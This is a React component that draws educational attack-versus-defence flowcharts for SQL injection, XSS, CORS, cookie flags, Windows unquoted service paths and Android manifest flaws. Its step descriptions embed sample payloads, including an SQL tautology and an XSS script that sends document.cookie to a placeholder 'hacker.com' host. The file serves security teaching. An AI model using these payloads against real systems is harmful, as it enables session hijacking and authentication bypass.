import { ShieldCheck, CheckCircle2, XCircle } from "lucide-react";

interface FlowchartNode {
  title: string;
  desc: string;
  type: "actor" | "vector" | "vuln" | "exploit" | "defense";
}

interface FlowchartProps {
  vulnerabilityType?: string;
  customTitle?: string;
}

export function SecurityFlowchart({ vulnerabilityType = "general", customTitle }: FlowchartProps) {
  const norm = vulnerabilityType.toLowerCase();

  let attackSteps: FlowchartNode[] = [];
  let defenseSteps: FlowchartNode[] = [];
  let title = customTitle || "Attack vs Defense Architecture Flowchart";

  if (norm.includes("sql") || norm.includes("cwe-89")) {
    title = "SQL Injection (SQLi) - Attack Flow vs Prepared Statements";
    attackSteps = [
      { title: "1. Attacker Input", desc: "Injects malicious SQL syntax e.g. `' OR '1'='1` into login form", type: "actor" },
      { title: "2. Unsanitized Query", desc: "App concatenates input into raw SQL: `SELECT * FROM users WHERE pass = '' OR '1'='1'`", type: "vector" },
      { title: "3. Database Execution", desc: "Database parser interprets input as code instead of data", type: "vuln" },
      { title: "4. Authentication Bypass", desc: "Query evaluates to TRUE, dumping records or granting admin session", type: "exploit" },
    ];
    defenseSteps = [
      { title: "1. Client Request", desc: "User submits credentials", type: "actor" },
      { title: "2. Parameterized Query", desc: "Backend pre-compiles query: `SELECT * FROM users WHERE pass = ?`", type: "defense" },
      { title: "3. Data Isolation", desc: "Database treats input strictly as literal text, syntax is not executed", type: "defense" },
      { title: "4. Query Protected", desc: "SQL injection fails, access denied unless password genuinely matches", type: "defense" },
    ];
  } else if (norm.includes("xss") || norm.includes("cwe-79") || norm.includes("script")) {
    title = "Cross-Site Scripting (XSS) - Reflection Flow vs Content-Security-Policy";
    attackSteps = [
      { title: "1. Malicious Payload", desc: "Attacker crafts link with `<script>fetch('//hacker.com/steal?c='+document.cookie)</script>`", type: "actor" },
      { title: "2. Reflection", desc: "Vulnerable web page echoes query parameter directly into HTML body without encoding", type: "vector" },
      { title: "3. Victim Browser Execution", desc: "Browser interprets injected tags as legitimate executable JavaScript", type: "vuln" },
      { title: "4. Session Hijacking", desc: "Script accesses `document.cookie` and exfiltrates session token to external server", type: "exploit" },
    ];
    defenseSteps = [
      { title: "1. Contextual Output Encoding", desc: "HTML entities encoded: `<` becomes `&lt;`, `>` becomes `&gt;`", type: "defense" },
      { title: "2. Content-Security-Policy", desc: "CSP header `script-src 'self'` blocks inline `<script>` tags & unauthorized hosts", type: "defense" },
      { title: "3. HttpOnly Cookies", desc: "Session cookie flag `HttpOnly` completely hides cookie from `document.cookie`", type: "defense" },
      { title: "4. Threat Neutralized", desc: "Injected payload renders as harmless visible text without executing", type: "defense" },
    ];
  } else if (norm.includes("cors") || norm.includes("cwe-942")) {
    title = "Insecure CORS Wildcard (*) vs Trusted Origin Allowlist";
    attackSteps = [
      { title: "1. Evil Origin", desc: "Victim visits `evil-site.com` while authenticated to target app", type: "actor" },
      { title: "2. Cross-Origin Fetch", desc: "Evil site issues JavaScript `fetch('https://target.com/api/user')`", type: "vector" },
      { title: "3. Wildcard Reflection", desc: "Server responds with `Access-Control-Allow-Origin: *` or echoes evil origin", type: "vuln" },
      { title: "4. Sensitive Data Theft", desc: "Browser permits evil site to read private API response headers & body", type: "exploit" },
    ];
    defenseSteps = [
      { title: "1. Strict Origin Validation", desc: "Server validates `Origin` against static trusted allowlist (no wildcard `*`)", type: "defense" },
      { title: "2. SameSite Cookies", desc: "Authentication cookies use `SameSite=Lax` or `SameSite=Strict`", type: "defense" },
      { title: "3. Preflight Check", desc: "Cross-origin request rejected with HTTP 403 Forbidden", type: "defense" },
      { title: "4. Data Confidential", desc: "Browser blocks evil site from reading cross-origin response payload", type: "defense" },
    ];
  } else if (norm.includes("cookie") || norm.includes("cwe-1004") || norm.includes("cwe-614")) {
    title = "Session Cookie Security - Plaintext/Client Access vs HttpOnly & Secure Flags";
    attackSteps = [
      { title: "1. Missing Flags", desc: "Server sets cookie: `Set-Cookie: session=xyz123; Path=/`", type: "vuln" },
      { title: "2. Cleartext Sniffing", desc: "Over public Wi-Fi without `Secure` flag, cookie travels in plaintext HTTP", type: "vector" },
      { title: "3. Script Theft", desc: "Any minor XSS flaw can read `document.cookie` because `HttpOnly` is absent", type: "vector" },
      { title: "4. Account Takeover", desc: "Attacker clones session cookie and masquerades as the victim", type: "exploit" },
    ];
    defenseSteps = [
      { title: "1. Hardened Cookie Header", desc: "Set-Cookie: session=xyz123; Secure; HttpOnly; SameSite=Lax; Path=/", type: "defense" },
      { title: "2. TLS-Only Encryption", desc: "`Secure` flag guarantees cookie is never sent over unencrypted HTTP", type: "defense" },
      { title: "3. JavaScript Sandbox", desc: "`HttpOnly` instructs browser engine to deny JS access to cookie", type: "defense" },
      { title: "4. CSRF Defense", desc: "`SameSite=Lax` blocks cookie transmission on third-party POST requests", type: "defense" },
    ];
  } else if (norm.includes("unquoted") || norm.includes("cwe-428") || norm.includes("service")) {
    title = "Windows Unquoted Service Path - Binary Hijacking vs Quoted Path";
    attackSteps = [
      { title: "1. Unquoted Path", desc: "Service configured as `C:\\Program Files\\My Tools\\service.exe` (no quotes)", type: "vuln" },
      { title: "2. Path Resolution Ambiguity", desc: "Windows searches: 1) `C:\\Program.exe`, 2) `C:\\Program Files\\My.exe`, 3) target", type: "vector" },
      { title: "3. Binary Plant", desc: "Standard user with write rights in `C:\\` plants malicious `Program.exe`", type: "exploit" },
      { title: "4. SYSTEM Escalation", desc: "On reboot, Windows Service Control Manager executes planted binary as SYSTEM", type: "exploit" },
    ];
    defenseSteps = [
      { title: "1. Enclosed in Quotes", desc: "Service path configured as `\"C:\\Program Files\\My Tools\\service.exe\"`", type: "defense" },
      { title: "2. Deterministic Execution", desc: "Windows treats entire string as single exact path, skipping space parsing", type: "defense" },
      { title: "3. NTFS Permissions", desc: "Root drive `C:\\` ACLs restricted so standard users cannot write files", type: "defense" },
      { title: "4. Secure Host", desc: "Service launches only the verified authentic vendor binary", type: "defense" },
    ];
  } else if (norm.includes("android") || norm.includes("debuggable") || norm.includes("apk")) {
    title = "Android App Security - Debuggable/Exported Exposure vs Production Hardening";
    attackSteps = [
      { title: "1. Insecure Manifest", desc: "`android:debuggable=\"true\"` or `android:exported=\"true\"` in production APK", type: "vuln" },
      { title: "2. Intent Spoofing / JDWP", desc: "Attacker app sends crafted Intent to exported Activity or connects JDWP via ADB", type: "vector" },
      { title: "3. Unauthorized Access", desc: "Bypasses in-app login screens, calls internal activities, dumps app memory", type: "exploit" },
      { title: "4. Data Compromise", desc: "SQLite databases, shared preferences, and session tokens extracted", type: "exploit" },
    ];
    defenseSteps = [
      { title: "1. Production Manifest", desc: "Build release APK with `android:debuggable=\"false\"` and ProGuard/R8 obfuscation", type: "defense" },
      { title: "2. Component Encapsulation", desc: "Set `android:exported=\"false\"` on all internal Activities, Services, and Receivers", type: "defense" },
      { title: "3. Signature Permission", desc: "Protect necessary exported endpoints with `android:protectionLevel=\"signature\"`", type: "defense" },
      { title: "4. Encrypted SharedPreferences", desc: "Store sensitive tokens using Android Jetpack Security MasterKey encryption", type: "defense" },
    ];
  } else {
    title = "Generic Web Vulnerability - Attack Vector vs Defense-in-Depth";
    attackSteps = [
      { title: "1. Reconnaissance & Input", desc: "Attacker probes endpoint with boundary-testing or malformed inputs", type: "actor" },
      { title: "2. Missing Validation", desc: "Server processes untrusted input directly without validation or encoding", type: "vector" },
      { title: "3. Vulnerability Trigger", desc: "Server executes unexpected command, leaks sensitive file, or reflects payload", type: "vuln" },
      { title: "4. Exploitation", desc: "Attacker achieves unauthorized data disclosure, session hijacking, or elevated access", type: "exploit" },
    ];
    defenseSteps = [
      { title: "1. Input Validation & Schema", desc: "Strict allowlist input validation rejecting unexpected characters upfront", type: "defense" },
      { title: "2. Defense-in-Depth Headers", desc: "Enforce CSP, HSTS, X-Frame-Options, and Referrer-Policy HTTP headers", type: "defense" },
      { title: "3. Least Privilege & Isolation", desc: "Application runs as unprivileged user in sandboxed environment/container", type: "defense" },
      { title: "4. Comprehensive Audit", desc: "Automated baseline scanning and continuous logging detect anomalies", type: "defense" },
    ];
  }

  return (
    <div
      style={{
        backgroundColor: "var(--bg-secondary)",
        border: "1px solid var(--border-color)",
        borderRadius: "10px",
        padding: "16px",
        marginTop: "14px",
      }}
    >
      <div style={{ fontWeight: 700, fontSize: "0.95rem", marginBottom: "14px", display: "flex", alignItems: "center", gap: "8px" }}>
        <ShieldCheck size={18} color="var(--accent-cyan)" />
        <span>{title}</span>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(280px, 1fr))", gap: "16px" }}>
        {/* Red: Attack Vector Flow */}
        <div
          style={{
            background: "rgba(239, 68, 68, 0.05)",
            border: "1px solid rgba(239, 68, 68, 0.25)",
            borderRadius: "8px",
            padding: "12px",
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: "6px", color: "var(--accent-rose)", fontWeight: 700, fontSize: "0.85rem", marginBottom: "12px" }}>
            <XCircle size={16} />
            <span>Attack Scenario (Vulnerable State)</span>
          </div>

          <div style={{ display: "flex", flexDirection: "column", gap: "8px" }}>
            {attackSteps.map((step, idx) => (
              <div key={idx}>
                <div
                  style={{
                    backgroundColor: "rgba(15, 23, 42, 0.8)",
                    border: "1px solid rgba(239, 68, 68, 0.2)",
                    borderRadius: "6px",
                    padding: "8px 10px",
                  }}
                >
                  <div style={{ fontSize: "0.8rem", fontWeight: 700, color: "#fca5a5" }}>
                    {step.title}
                  </div>
                  <div style={{ fontSize: "0.74rem", color: "var(--text-muted)", marginTop: "2px" }}>
                    {step.desc}
                  </div>
                </div>
                {idx < attackSteps.length - 1 && (
                  <div style={{ display: "flex", justifyContent: "center", padding: "2px 0", color: "#f87171" }}>
                    ↓
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>

        {/* Green: Defensive Mitigation Flow */}
        <div
          style={{
            background: "rgba(16, 185, 129, 0.05)",
            border: "1px solid rgba(16, 185, 129, 0.25)",
            borderRadius: "8px",
            padding: "12px",
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: "6px", color: "var(--accent-emerald)", fontWeight: 700, fontSize: "0.85rem", marginBottom: "12px" }}>
            <CheckCircle2 size={16} />
            <span>Defensive Architecture (Mitigated State)</span>
          </div>

          <div style={{ display: "flex", flexDirection: "column", gap: "8px" }}>
            {defenseSteps.map((step, idx) => (
              <div key={idx}>
                <div
                  style={{
                    backgroundColor: "rgba(15, 23, 42, 0.8)",
                    border: "1px solid rgba(16, 185, 129, 0.2)",
                    borderRadius: "6px",
                    padding: "8px 10px",
                  }}
                >
                  <div style={{ fontSize: "0.8rem", fontWeight: 700, color: "#86efac" }}>
                    {step.title}
                  </div>
                  <div style={{ fontSize: "0.74rem", color: "var(--text-muted)", marginTop: "2px" }}>
                    {step.desc}
                  </div>
                </div>
                {idx < defenseSteps.length - 1 && (
                  <div style={{ display: "flex", justifyContent: "center", padding: "2px 0", color: "#4ade80" }}>
                    ↓
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
